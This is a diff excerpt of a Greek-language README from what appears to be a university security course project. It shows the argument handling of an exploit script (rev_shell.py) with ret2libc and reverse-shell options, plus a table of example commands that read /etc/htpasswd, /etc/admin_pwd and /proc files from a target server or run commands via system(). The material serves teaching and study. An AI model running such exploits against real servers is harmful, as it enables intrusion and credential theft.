+                   print("{}Error:{} Cannot open file {}{}{}".format(colors["Bright_Red"], colors["Reset"], colors["Light_Green"], export_path, colors["Reset"]))
+                   exit()
+
+               fp.write(response.content)
+               fp.close()
+
+           else:
+               print(response.text)
+
+   # ---------------------------------------------------------------------------------------------------- #
+   # ---------------------------------------------------------------------------------------------------- #
+
+   if __name__ == "__main__":
+
+       # Change default password
+       if '-p' in argv:
+           password = argv[argv.index('-p') + 1]
+       else:
+           password = 'you shall not pass'
+
+
+       # Change timeout parameter for POST request
+       if '-t' in argv:
+           if argv[argv.index('-t') + 1] == 'None':
+               timeout = None
+           else:
+               timeout = float(argv[argv.index('-t') + 1])
+       else:
+           timeout = 5
+
+
+       # Disable messages
+       if '-d' in argv:
+           messages = 0
+       else:
+           messages = 1
+
+
+       # Enable ret2libc attack
+       if '-s' in argv:
+           ret2libc = 1
+       else:
+           ret2libc = 0
+
+
+       # Export results into file
+       if '-xd' in argv:
+           export_results = argv[argv.index('-xd') + 1]
+       else:
+           export_results = None
+
+
+       # Export binary payload into file
+       if '-xp' in argv:
+           export_payload = argv[argv.index('-xp') + 1]
+       else:
+           export_payload = None
+
+
+       # Enable reverse shell
+       if '-rs' in argv:
+           rev_shell(argv[1], password, timeout)
+       else:
+           perform_attack(argv[1], password, argv[2], ret2libc, export_results, export_payload, timeout, messages)
+   ```
+
+   </p>
+</details><br/>
+
+<details>
+<summary><b>Click here to see how to run examples</b></summary>
+   <p>
+
+   |Run Examples|Description|Output|
+   |-|-|-|
+   |python3 rev_shell.py 8000 /etc/htpasswd|Επιστρέφει τα περιεχόμενα του αρχείου που δόθηκε σαν όρισμα|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/34-Rev_Shell_Example1.png)|
+   |python3 rev_shell.py 8000 "ls -la" -s|Εκτελεί τη δοσμένη εντολή μέσω της `system()`|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/35-Rev_Shell_Example2.png)|
+   |python3 rev_shell.py 9000 www/htpasswd -p my_pass|Αλλάζει τον κωδικό που θα χρησιμοποιηθεί για το authentication. Κυρίως για χρήση σε τοπικούς servers|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/36-Rev_Shell_Example3.png)|
+   |python3 rev_shell.py 8000 /proc/self/maps -t None|Αλλάζει το timeout του request (χρησιμεύει κυρίως για πειραματισμούς)|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/37-Rev_Shell_Example4.png)|
+   |python3 rev_shell.py 8000 /proc/net/tcp -xd respond.txt -xp payload.txt|Κάνει εξαγωγή του respond και του payload αντιστοίχως, στα αρχεία που δόθηκαν ως ορίσματα|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/38-Rev_Shell_Example5.png)|
+   |python3 rev_shell.py 8000 /etc/admin_pwd -d|Απενεργοποιεί τα μηνύματα προόδου του request|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/39-Rev_Shell_Example6.png)|
+   |python3 rev_shell.py 8000 -rs|Ενεργοποιεί την προσομοίωση του **Reverse Shell*|![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/40-Rev_Shell_Example7.png)|
    
-   
+   </p>
+</details><br/>
 
 ## References
 
@@ -876,4 +1575,5 @@
 <h5><sup>[16]</sup>  http://www.kasparov.com/timeline-event/deep-blue/</h5>
 <h5><sup>[17]</sup>  https://www.netsparker.com/blog/web-security/exposing-public-ips-tor-services-through-ssl-certificates/</h5>
 <h5><sup>[18]</sup>  https://www.bleepingcomputer.com/news/security/public-ip-addresses-of-tor-sites-exposed-via-ssl-certificates/</h5>
-
+<h5><sup>[19]</sup>  https://blog.lamarranet.com/index.php/exploit-education-phoenix-heap-two-solution/</h5>
+<h5><sup>[20]</sup>  https://qiita.com/v_avenger/items/8afcf758990c9ab03ad7</h5>
